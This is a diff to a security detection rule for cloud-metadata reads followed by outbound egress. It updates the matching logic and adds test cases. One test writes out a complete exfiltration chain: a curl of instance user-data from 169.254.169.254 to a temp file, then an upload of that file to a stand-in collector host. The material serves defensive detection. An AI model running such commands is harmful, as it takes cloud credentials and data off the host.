@@ -1,6 +1,6 @@
 id: cloud-metadata-then-egress
 spec: threat-rules/v1.3  # needed for args and predicates
-version: 2
+version: 3
 title: Cloud metadata access followed by outbound network egress
 description: >
   A session reads cloud instance metadata (IMDS 169.254.169.254 or a provider
@@ -9,9 +9,9 @@ description: >
   credentials, then exfiltrate them off-box. Both steps find curl or wget by what
   the line runs: the metadata target (see cloud_metadata_target) must be a word of
   that client, and the outbound URL must be a word of that client that is not a
-  metadata or link-local address. A line the parser cannot vouch for (see
-  command_unread) is matched on its text, so a read through `ssh host '...'` still
-  counts and one named in a commit message or a here-document does not.
+  metadata or link-local address. The text pattern is asked of the text that reaches a
+  command the parser cannot see into (unread_text), so a read through `ssh host '...'`
+  still counts and one named in a commit message or a here-document does not.
 severity: critical
 status: stable
 posture: detect
@@ -23,7 +23,8 @@ taxonomy:
 # read_metadata is the condition of cloud-metadata-endpoint-access. In egress the outside
 # URL is one word of the client, so a metadata address in another word of the line (a
 # header, a second command) no longer hides the request, as it did when the whole text was
-# asked. The text of an unread line is asked as before.
+# asked. The text pattern is asked of the text that reaches a command the parser cannot
+# see into (unread_text).
 correlation:
   scope: session
   window: 120s
@@ -34,9 +35,8 @@ correlation:
           e.command.parsed_commands.exists(c, c.name.matches("^(curl|wget)$") && (
             c.argv_raw.exists(a, cloud_metadata_target(a)) ||
             client_target_unseen(c) && cloud_metadata_target(e.command.command))) ||
-          (e.command.command.matches("(?i)\\b(curl|wget)\\b") &&
-            cloud_metadata_target(e.command.command) &&
-            command_unread(e))
+          unread_text(e, t, t.matches("(?i)\\b(curl|wget)\\b") &&
+            cloud_metadata_target(t))
         )
     - id: egress
       match: >
@@ -44,10 +44,9 @@ correlation:
           e.command.parsed_commands.exists(c, c.name.matches("^(curl|wget)$") &&
             c.argv_raw.exists(a, a.matches("(?i)https?://") &&
               !cloud_metadata_target(a) && !a.matches("169\\.254\\."))) ||
-          (e.command.command.matches("(?i)\\b(curl|wget)\\b.*https?://") &&
-            !cloud_metadata_target(e.command.command) &&
-            !e.command.command.matches("169\\.254\\.") &&
-            command_unread(e))
+          unread_text(e, t, t.matches("(?i)\\b(curl|wget)\\b.*https?://") &&
+            !cloud_metadata_target(t) &&
+            !t.matches("169\\.254\\."))
         )
 
 emit:
@@ -177,5 +176,23 @@ tests:
         session: { id: s1 }
       - event: { action: command.executed }
         command: { command: "curl -s http://169.254.10.20/status" }
+        session: { id: s1 }
+  - name: both_steps_given_to_programs_the_parser_cannot_see_into
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "python3 -c \"import os; os.system('curl -s http://169.254.169.254/latest/user-data -o /tmp/ud.txt')\"" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "./upload.sh 'curl -s -T /tmp/ud.txt https://collector.example/u'" }
+        session: { id: s1 }
+  - name: metadata_read_named_in_a_commit_message_beside_a_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'docs: curl http://169.254.169.254/latest/meta-data/ is blocked by the proxy' && ./run-tests.sh" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "curl -s https://api.example.com/health" }
         session: { id: s1 }
 
